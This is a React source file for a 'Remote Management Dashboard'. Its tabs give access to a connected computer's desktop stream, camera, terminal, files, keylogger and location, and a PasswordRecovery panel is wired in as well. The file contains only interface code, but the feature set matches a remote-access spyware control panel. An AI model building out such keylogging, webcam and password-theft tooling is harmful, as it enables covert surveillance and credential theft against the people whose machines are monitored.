
import React, { useState } from "react";
import { useRemote } from "@/context/RemoteContext";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import {
  LayoutGrid,
  List,
  Computer,
  Terminal as TerminalIcon,
  Folder,
  Camera,
  Key,
  MapPin,
  Settings
} from "lucide-react";
import ComputerCard from "./ComputerCard";
import ComputerList from "./ComputerList";
import CategoryManager from "./CategoryManager";
import StreamView from "./StreamView";
import Terminal from "./Terminal";
import FileExplorer from "./FileExplorer";
import LocationView from "./LocationView";
import KeyloggerView from "./KeyloggerView";
import PasswordRecovery from "./PasswordRecovery";

const Dashboard: React.FC = () => {
  const { computers, categories, viewMode, toggleViewMode, activeComputer, setActiveComputer } = useRemote();
  const [activeTab, setActiveTab] = useState("stream");

  const computersByCategory: Record<string, typeof computers> = {};
  
  // Group computers by category
  computers.forEach((computer) => {
    const categoryId = computer.categoryId || "uncategorized";
    if (!computersByCategory[categoryId]) {
      computersByCategory[categoryId] = [];
    }
    computersByCategory[categoryId].push(computer);
  });

  const handleBackToComputers = () => {
    setActiveComputer(null);
  };
  
  return (
    <div className="min-h-screen bg-background">
      <div className="container mx-auto py-6 px-4 space-y-6">
        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
          <div>
            <h1 className="text-2xl font-bold">Remote Management Dashboard</h1>
            <p className="text-muted-foreground">
              {activeComputer
                ? `Connected to ${activeComputer.hostname}`
                : "Manage and monitor your remote computers"}
            </p>
          </div>
          
          <div className="flex items-center space-x-2">
            {activeComputer ? (
              <Button variant="outline" onClick={handleBackToComputers}>
                Back to Computers
              </Button>
            ) : (
              <>
                <CategoryManager />
                <Button
                  variant="outline"
                  size="icon"
                  onClick={toggleViewMode}
                  className="ml-2"
                >
                  {viewMode === "grid" ? (
                    <List className="h-4 w-4" />
                  ) : (
                    <LayoutGrid className="h-4 w-4" />
                  )}
                </Button>
              </>
            )}
          </div>
        </div>
        
        {activeComputer ? (
          <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
            <TabsList className="grid grid-cols-3 md:grid-cols-6 w-full">
              <TabsTrigger value="stream">
                <Computer className="h-4 w-4 mr-2" />
                <span className="hidden sm:inline">Desktop</span>
              </TabsTrigger>
              <TabsTrigger value="camera">
                <Camera className="h-4 w-4 mr-2" />
                <span className="hidden sm:inline">Camera</span>
              </TabsTrigger>
              <TabsTrigger value="terminal">
                <TerminalIcon className="h-4 w-4 mr-2" />
                <span className="hidden sm:inline">Terminal</span>
              </TabsTrigger>
              <TabsTrigger value="files">
                <Folder className="h-4 w-4 mr-2" />
                <span className="hidden sm:inline">Files</span>
              </TabsTrigger>
              <TabsTrigger value="keylogger">
                <Key className="h-4 w-4 mr-2" />
                <span className="hidden sm:inline">Keylogger</span>
              </TabsTrigger>
              <TabsTrigger value="location">
                <MapPin className="h-4 w-4 mr-2" />
                <span className="hidden sm:inline">Location</span>
              </TabsTrigger>
            </TabsList>
            
            <div className="mt-4 bg-card rounded-lg border shadow-sm min-h-[600px]">
              <TabsContent value="stream" className="h-[600px]">
                <StreamView />
              </TabsContent>
              
              <TabsContent value="camera" className="h-[600px]">
                <StreamView />
              </TabsContent>
              
              <TabsContent value="terminal" className="h-[600px]">
                <Terminal />
              </TabsContent>
              
              <TabsContent value="files" className="h-[600px]">
                <FileExplorer />
              </TabsContent>
              
              <TabsContent value="keylogger" className="h-[600px]">
                <KeyloggerView />
              </TabsContent>
              
              <TabsContent value="location" className="h-[600px]">
                <LocationView />
              </TabsContent>
              
              <TabsContent value="passwords" className="h-[600px]">
                <PasswordRecovery />
              </TabsContent>
            </div>
          </Tabs>
        ) : (
          <div>
            {viewMode === "grid" ? (
              <>
                {Object.entries(computersByCategory).map(([categoryId, computers]) => (
                  <div key={categoryId} className="mb-8">
                    <h2 className="text-xl font-semibold mb-4">
                      {categoryId === "uncategorized"
                        ? "Uncategorized"
                        : categories.find((c) => c.id === categoryId)?.name || "Unknown Category"}
                    </h2>
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
                      {computers.map((computer) => (
                        <ComputerCard key={computer.id} computer={computer} />
                      ))}
                    </div>
                  </div>
                ))}
              </>
            ) : (
              <ComputerList />
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default Dashboard;
